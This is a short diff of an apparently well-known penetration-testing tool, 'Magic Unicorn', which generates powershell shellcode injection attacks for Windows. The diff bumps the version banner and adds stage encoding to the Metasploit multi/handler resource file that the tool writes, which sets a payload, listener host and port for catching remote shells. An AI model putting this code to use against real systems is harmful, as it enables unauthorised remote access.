@@ -181,7 +181,7 @@ The last one will use a 500 character string instead of the default 380, resulti
 
 # usage banner
 def gen_usage():
-    print "-------------------- Magic Unicorn Attack Vector v2.0-----------------------------"
+    print "-------------------- Magic Unicorn Attack Vector v2.1.2-----------------------------"
     print "\nNative x86 powershell injection attacks on any Windows platform."
     print "Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)"
     print "Twitter: @TrustedSec, @HackingDave"
@@ -313,7 +313,7 @@ def gen_shellcode_attack(payload, ipaddr, port):
     shellcode = newdata[:-1]
 
     # write out rc file
-    writefile("unicorn.rc", "use multi/handler\nset payload %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nexploit -j\n" % (payload, ipaddr, port))
+    writefile("unicorn.rc", "use multi/handler\nset payload %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nset EnableStageEncoding true\nexploit -j\n" % (payload, ipaddr, port))
 
     # one line shellcode injection with native x86 shellcode
     powershell_code = (
